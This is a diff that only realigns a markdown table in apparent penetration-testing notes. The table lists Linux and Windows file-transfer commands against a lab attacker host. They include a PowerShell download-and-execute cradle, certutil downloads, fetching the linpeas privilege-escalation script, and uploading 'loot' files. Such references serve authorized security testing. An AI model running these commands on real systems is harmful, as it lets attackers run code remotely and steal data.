@@ -1,16 +1,16 @@
 ## Web Server
 
-|Operation|Command|Platform|
-|---|---|---|
-|Host (files)|`sudo python3 -m http.server 8000`|Linux|
-|Host (upload)|`sudo python3 -m uploadserver 8000`|Linux|
-|Download|`wget http://10.10.10.10:8000/linpeas.sh -O /tmp/linpeas.sh`|Linux|
-|Download|`curl http://10.10.10.10:8000/linpeas.sh -o /tmp/linpeas.sh`|Linux|
-|Download|`IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/script.ps1')`|Windows|
-|Download (disk)|`(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe','C:\Temp\file.exe')`|Windows|
-|Download|`certutil.exe -urlcache -split -f http://10.10.10.10:8000/file.exe C:\Temp\file.exe`|Windows|
-|Upload|`curl -X POST http://10.10.10.10:8000/upload -F 'files=@/tmp/loot.txt'`|Linux|
-|Upload|`Invoke-WebRequest -Uri http://10.10.10.10:8000/upload -Method POST -Body $b64`|Windows|
+| Operation       | Command                                                                                          | Platform |
+| --------------- | ------------------------------------------------------------------------------------------------ | -------- |
+| Host (files)    | `sudo python3 -m http.server 8000`                                                               | Linux    |
+| Host (upload)   | `sudo python3 -m uploadserver 8000`                                                              | Linux    |
+| Download        | `wget http://10.10.10.10:8000/linpeas.sh -O /tmp/linpeas.sh`                                     | Linux    |
+| Download        | `curl http://10.10.10.10:8000/linpeas.sh -o /tmp/linpeas.sh`                                     | Linux    |
+| Download        | `IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/script.ps1')`            | Windows  |
+| Download (disk) | `(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe','C:\Temp\file.exe')` | Windows  |
+| Download        | `certutil.exe -urlcache -split -f http://10.10.10.10:8000/file.exe C:\Temp\file.exe`             | Windows  |
+| Upload          | `curl -X POST http://10.10.10.10:8000/upload -F 'files=@/tmp/loot.txt'`                          | Linux    |
+| Upload          | `Invoke-WebRequest -Uri http://10.10.10.10:8000/upload -Method POST -Body $b64`                  | Windows  |
 
 ---
 
